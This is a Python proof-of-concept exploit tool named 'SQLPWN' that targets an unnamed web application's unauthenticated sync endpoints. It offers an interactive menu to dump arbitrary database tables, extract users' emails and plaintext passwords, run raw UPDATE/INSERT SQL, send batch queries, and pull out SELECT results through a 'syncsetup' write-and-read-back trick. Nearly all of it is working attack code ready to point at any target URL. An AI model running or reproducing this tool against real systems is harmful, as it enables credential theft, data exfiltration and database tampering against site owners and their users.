import sys
import json
import requests

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        r" ____   ___  _     ____  __    __ _  _ ",
        r"/ ___| / _ \| |   |  _ \\\ \  / // \| |",
        r"\___ \| | | | |   | |_) |\ \/ / | . ` |",
        r" ___) | |_| | |___|  __/  \  /  | |\  |",
        r"|____/ \__\_\_____|_|      \/   |_| \_|",
    ]
    title_lines = [f"{RED}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"{DIM}  ┌─────────────────────────┐  {RESET}",
        f"{DIM}  │ {RESET}{YELLOW}mysql>{RESET}{DIM}                   │  {RESET}",
        f"{DIM}  │ {RESET}{GREEN}SELECT * FROM users;{RESET}{DIM}     │  {RESET}",
        f"{DIM}  │ {RESET}{CYAN}+----+-------+----------+{RESET}{DIM} │  {RESET}",
        f"{DIM}  │ {RESET}{CYAN}| id | name  | passwdstr|{RESET}{DIM} │  {RESET}",
        f"{DIM}  └─────────────────────────┘  {RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    blank = " " * T

    top_pad    = [""] * 3
    bot_pad    = [""] * 3
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 3 + art + [""] * 1

    out = [f"\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  unauthenticated sql execution  ·  SECURITY_AUDIT POC #1 / #2{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── menu helpers ──────────────────────────────────────────────────────────────

MODES = [
    (CYAN,    "Dump table rows              (cloudNewData/{table}/0)"),
    (CYAN,    "Get table columns            (getTableFields/{table})"),
    (YELLOW,  "Dump users + plaintext pass  (cloudNewData/users/0)"),
    (RED,     "Execute raw SQL              (synchornization/process/updatelogs)"),
    (RED,     "Batch SQL via querylogsToCloud"),
    (MAGENTA, "Exfiltrate SELECT → syncsetup trick"),
]

def print_menu():
    print(f"\n  {DIM}┌{'─' * 56}┐{RESET}")
    for i, (color, desc) in enumerate(MODES, 1):
        pad = " " * (54 - len(desc))
        print(f"  {DIM}│{RESET}  {color}[{i}]{RESET} {desc}{pad}{DIM}│{RESET}")
    print(f"  {DIM}│{RESET}  {RED}[0]{RESET} Exit{' ' * 49}{DIM}│{RESET}")
    print(f"  {DIM}└{'─' * 56}┘{RESET}")

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

HEADERS = {"X-Requested-With": "XMLHttpRequest"}

def _get(path, params=None):
    try:
        r = requests.get(f"{BASE_URL}{path}", params=params, headers=HEADERS, timeout=10)
        return r
    except Exception as e:
        print(f"  {RED}[!]{RESET} Request error: {e}")
        return None

def _post(path, data=None, params=None):
    try:
        r = requests.post(f"{BASE_URL}{path}", params=params, data=data, headers=HEADERS, timeout=10)
        return r
    except Exception as e:
        print(f"  {RED}[!]{RESET} Request error: {e}")
        return None

# ── main loop ─────────────────────────────────────────────────────────────────

while True:
    print_menu()
    try:
        choice = input(
            f"  {DIM}┌─[{RESET}{RED}sqlpwn{RESET}{DIM}@{RESET}{YELLOW}unauth{RESET}{DIM}]─[~]{RESET}\n"
            f"  {DIM}└──╼{RESET} {GREEN}${RESET} "
        ).strip()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    if choice == "0":
        print(f"\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    elif choice == "1":
        # Dump any table via cloudNewData
        try:
            table = input(f"  {CYAN}[?]{RESET} Table name [users]: ").strip() or "users"
            max_id = input(f"  {CYAN}[?]{RESET} Start from id [0]: ").strip() or "0"
        except KeyboardInterrupt:
            continue
        print(f"\n  {DIM}[>]{RESET} GET /cloudNewData/{table}/{max_id}")
        r = _get(f"/cloudNewData/{table}/{max_id}")
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        try:
            data = r.json()
            if not data:
                print(f"  {YELLOW}[!]{RESET} Empty response — table may not exist or has no rows.")
                continue
            print(f"  {GREEN}[+]{RESET} {len(data)} rows returned\n")
            out_file = f"dumps\dump_{table}.json"
            with open(out_file, "w") as f:
                json.dump(data, f, indent=2)
            print(f"  {GREEN}[✓]{RESET} Saved → {CYAN}{out_file}{RESET}")
            print(f"  {DIM}    Preview (first row):{RESET}")
            print(f"  {DIM}    {json.dumps(data[0], indent=4)[:300]}{RESET}")
        except Exception:
            print(f"  {DIM}{r.text[:500]}{RESET}")

    elif choice == "2":
        # Get table columns via getTableFields
        try:
            table = input(f"  {CYAN}[?]{RESET} Table name [users]: ").strip() or "users"
        except KeyboardInterrupt:
            continue
        print(f"\n  {DIM}[>]{RESET} GET /getTableFields/{table}")
        r = _get(f"/getTableFields/{table}")
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        try:
            fields = r.json()
            print(f"\n  {GREEN}[+]{RESET} Columns in {CYAN}{table}{RESET}:")
            for col in fields:
                print(f"  {DIM}    · {RESET}{col}")
        except Exception:
            print(f"  {DIM}{r.text[:400]}{RESET}")

    elif choice == "3":
        # Dump users table — highlight passwordstr (plaintext)
        print(f"\n  {DIM}[>]{RESET} GET /cloudNewData/users/0")
        r = _get("/cloudNewData/users/0")
        if r is None: continue
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        try:
            users = r.json()
            if not users:
                print(f"  {YELLOW}[!]{RESET} Empty — endpoint may require auth or table name differs.")
                continue
            print(f"\n  {GREEN}[+]{RESET} {len(users)} user records\n")
            print(f"  {CYAN}{'ID':<6} {'Email':<30} {'Type':<6} {'Plaintext PW':<20}{RESET}")
            print(f"  {DIM}{'─'*62}{RESET}")
            for u in users[:50]:
                uid    = str(u.get("id",""))
                email  = str(u.get("email",""))[:29]
                utype  = str(u.get("type",""))
                pwstr  = str(u.get("passwordstr","") or "")
                color  = YELLOW if pwstr else DIM
                print(f"  {uid:<6} {email:<30} {utype:<6} {color}{pwstr:<20}{RESET}")
            if len(users) > 50:
                print(f"\n  {DIM}... {len(users)-50} more rows — see dump_users.json{RESET}")
            out_file = "dumps/4dump_users.json"
            with open(out_file, "w") as f:
                json.dump(users, f, indent=2)
            print(f"\n  {GREEN}[✓]{RESET} Full dump saved → {CYAN}{out_file}{RESET}")
        except Exception:
            print(f"  {DIM}{r.text[:500]}{RESET}")

    elif choice == "4":
        # Execute raw SQL via updatelogs (DB::update — use UPDATE/INSERT)
        print(f"\n  {YELLOW}[!]{RESET} This endpoint calls {CYAN}DB::update(){RESET} — use {YELLOW}UPDATE{RESET} or {YELLOW}INSERT{RESET} statements.")
        print(f"  {DIM}    For SELECT, use mode 6 (syncsetup exfiltration trick).{RESET}\n")
        try:
            sql = input(f"  {CYAN}[?]{RESET} SQL query: ").strip()
            bindings_raw = input(f"  {CYAN}[?]{RESET} Bindings (comma-sep, leave blank): ").strip()
        except KeyboardInterrupt:
            continue
        bindings = [b.strip() for b in bindings_raw.split(",")] if bindings_raw else []
        params = {"query": sql}
        for i, b in enumerate(bindings):
            params[f"binding[{i}]"] = b
        print(f"\n  {DIM}[>]{RESET} GET /synchornization/process/updatelogs")
        print(f"  {DIM}    SQL: {RESET}{sql[:100]}")
        r = _get("/synchornization/process/updatelogs", params=params)
        if r is None: continue
        sc = GREEN if r.status_code < 400 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    Response: {RESET}{r.text[:500]}")

    elif choice == "5":
        # Batch SQL via querylogsToCloud
        print(f"\n  {YELLOW}[!]{RESET} Enter queries one per line. Empty line to send.")
        queries = []
        try:
            while True:
                line = input(f"  {DIM}sql>{RESET} ").strip()
                if not line:
                    break
                queries.append({"query": line, "bindings": []})
        except KeyboardInterrupt:
            continue
        if not queries:
            continue
        logs_json = json.dumps(queries)
        print(f"\n  {DIM}[>]{RESET} GET /querylogsToCloud  ({len(queries)} queries)")
        r = _get("/querylogsToCloud", params={"logs": logs_json})
        if r is None: continue
        sc = GREEN if r.status_code < 400 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    Response: {RESET}{r.text[:500]}")

    elif choice == "6":
        # SELECT exfiltration via UPDATE syncsetup trick
        print(f"\n  {DIM}Trick: stores SELECT result into syncsetup.url, then reads it back.{RESET}\n")
        try:
            select_sql = input(f"  {CYAN}[?]{RESET} SELECT subquery (without SELECT keyword, e.g. GROUP_CONCAT(email) FROM users): ").strip()
        except KeyboardInterrupt:
            continue
        update_sql = f"UPDATE syncsetup SET url=(SELECT {select_sql}) WHERE id=1"
        params = {"query": update_sql}
        print(f"\n  {DIM}[>]{RESET} Injecting SELECT into syncsetup.url ...")
        r = _get("/synchornization/process/updatelogs", params=params)
        if r is None: continue
        sc = GREEN if r.status_code < 400 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  — reading back result ...")
        r2 = _get("/cloudGetSyncSetup")
        if r2 is None: continue
        try:
            data = r2.json()
            for item in (data if isinstance(data, list) else [data]):
                url_val = item.get("url","")
                print(f"\n  {GREEN}[+]{RESET} Exfiltrated: {YELLOW}{url_val}{RESET}")
        except Exception:
            print(f"  {DIM}{r2.text[:500]}{RESET}")

    else:
        print(f"\n  {RED}[!]{RESET} Invalid choice.\n")
